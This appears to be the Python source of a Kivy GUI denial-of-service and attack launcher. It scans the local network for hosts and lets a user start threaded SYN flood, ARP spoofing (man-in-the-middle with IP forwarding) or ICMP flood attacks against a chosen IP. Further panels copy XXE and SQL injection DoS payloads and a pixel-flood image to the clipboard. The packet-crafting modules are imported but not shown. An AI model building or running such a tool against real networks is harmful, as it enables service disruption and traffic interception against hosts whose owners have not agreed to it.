from threading import Thread
import threading
from time import sleep

from kivy.clock import Clock
from kivy.app import App
from kivy.uix.widget import Widget
from kivy.uix.label import Label
from kivy.core.window import Window
from kivy.uix.floatlayout import FloatLayout
from kivy.animation import Animation
from kivy.uix.popup import Popup
from modules.arp import ARPSpoofer, disable_ip_forwarding, enable_ip_forwarding
import os

import netifaces

import modules.auxilliary
from modules.smurf_attack import smurf_packet
from modules.syn_flood import syn_flood_packet


class MyApp(App):
    def build(self):
        return FloatLayouts()

class FloatLayouts(FloatLayout):
    def CickedOne(self):
        showPopUp1()

    def CickedTwo(self):
        showPopUp2()

    def CickedThree(self):
        showPopUp3()

    def CickedFour(self):
        showPopUp4()


class P1(FloatLayout):
    ATTACK_STOP = False
    ATTACK_RUN = False
    Dane = modules.auxilliary.dane()
    c = None
    d = None
    finished = True
    Dane.STOP = False
    def ClickedConf1(self):
        Clock.schedule_interval(self.Refresh, 1)
        if(P1.finished==True):
            if(P1.c==None):
                P1.finished = False
                P1.c = Thread(target=self.SearchForHosts)
                #P1.c.daemon = True
                P1.c.start()
                
                
        else:
            self.Dane.STOP = True
            P1.c.join()
            self.ids.scan_button.text = "Scan"
            P1.c = None
            P1.finished = True
        
        
    def spinner_clicked(self, value):
        print("Selected ip is " + value)
        self.ids.button_atk.disabled = False


    def spinner_clicked_atk(self, value):
        print("Selected attack is " + value)


    
    def ClickedConf1_atk(self):
        if(P1.ATTACK_RUN == False):
            try:
                #Run attack
                P1.ATTACK_RUN = True
                self.ids.button_atk.text = "Stop"
                if (self.ids.spinner_id_atk.text == "SYN flood"):
                    P1.d = Thread(target = self.SynFlood, args=(self.ids.spinner_id.text,))
                    print(str(self.ids.spinner_id.text))
                    P1.d.start()
                elif (self.ids.spinner_id_atk.text == "ARP spoof"):
                    #ARP do przerobienia, nast odkomentowac
                    P1.d = Thread(target=self.ARP, args=(self.ids.spinner_id.text,))
                    P1.d.start()
                    print("ARP")
                elif (self.ids.spinner_id_atk.text == "ICMP flood"):
                    P1.d = Thread(target=self.Smurf, args=(self.ids.spinner_id.text,))
                    P1.d.start()
                else:
                    print("Nieznany atak")
            except Exception:
                self.ids.button_atk.text = "Attack"
                print("Atak zrobił salto : ")
        else:
            #Stop attack
            self.ids.button_atk.text = "Attack"
            P1.ATTACK_STOP = True
            P1.d.join()
            P1.d = None
            P1.ATTACK_RUN = False



    def SearchForHosts(self):
        net_info = self.Dane.get_network_info()
        print(net_info)
        result = self.Dane.scan_network_multi_thread(net_info[3],net_info[4])
        print(result)
        P1.finished = True
        print("[INFO] succesfully closed threads")
        try:
            P1.c.join()
        except:
            print("kupa")
        P1.c = None

    def Refresh(self, interval):
        if(P1.finished == False):
            self.ids.scan_button.text = self.Dane.Percent
            #print("r-"+self.Dane.Percent)
            self.ids.spinner_id.values = self.Dane.HOSTS
        else:
            self.ids.scan_button.text = "Scan"

    def SynFlood(self, IP:str):
        self.ids.Satus_label.text = "[b]Attack status: Scanning[/b]"
        print("starting syn flood")
        port = self.Dane.scan_host_ports_multi_thread_get_first(IP)
        self.ids.Satus_label.text = "[b]Attack status: Attacking[/b]"
        threads = []
        while(P1.ATTACK_STOP != True):
            thread = threading.Thread(target = syn_flood_packet,args = [str(IP),port])
            sleep(0.2)
            thread.start()
            threads.append(thread)
        
        print("ending syn flood")
        for t in threads:
            t.join()
        P1.ATTACK_STOP = False
        self.ids.Satus_label.text = "[b]Attack status: IDLE[/b]"
        print("syn flood closed all threads")
    
    def ARP(self, IP):
        print("starting ARP")
        self.ids.Satus_label.text = "[b]Attack status: attacking[/b]"

        #to nie będzie działać, trzeba przerobić funkcję tak by dało się ją wylączyć
        enable_ip_forwarding()
        iface = netifaces.gateways()['default'][netifaces.AF_INET][1]
        print(iface)
        spoofer = ARPSpoofer(iface, IP, self.Dane.HOSTS[0])
        spoofer.mitm_init()
        
        while(self.ATTACK_STOP != True):
            spoofer.mitm_trick()
        
        spoofer.reARP()
        disable_ip_forwarding()
        #koniec fragmentu do edycji

        self.ids.Satus_label.text = "[b]Attack status: IDLE[/b]"
        P1.ATTACK_STOP = False
    
    def Smurf(self, IP):
        print("starting ICMP flood")
        self.ids.Satus_label.text = "[b]Attack status: attacking[/b]"
        while(self.ATTACK_STOP != True):
            smurf_packet(IP)
        self.ids.Satus_label.text = "[b]Attack status: IDLE[/b]"
        P1.ATTACK_STOP = False

      
        
        

    

class P2(FloatLayout):
    def ClickedConf2(self):
        print("button on conf 2")
        self.ids.XXE_ID.copy(data=self.ids.XXE_ID.text)

class P3(FloatLayout):
    def ClickedConf3(self):
        print("button on conf 3")
        self.ids.SQLI_ID.copy(data=self.ids.SQLI_ID.text)

class P4(FloatLayout):
    def ClickedConf4(self):
        self.ids.PF_ID.copy(data = os.path.abspath('modules/lottapixel.jpg'))
    

def showPopUp1():
    show = P1()
    popupWindow = Popup(title="Wifi DOS Conf", content=show, size_hint=(0.8,0.8) )
    popupWindow.open()

def showPopUp2():
    show = P2()
    popupWindow = Popup(title="XXE DOS", content=show, size_hint=(0.8,0.8) )
    popupWindow.open()

def showPopUp3():
    show = P3()
    popupWindow = Popup(title="SQLI DOS", content=show, size_hint=(0.8,0.8) )
    popupWindow.open()
    

def showPopUp4():
    show = P4()
    popupWindow = Popup(title="Pixel flood", content=show, size_hint=(0.8,0.8) )
    popupWindow.open()


if __name__ == '__main__':
    MyApp().run()
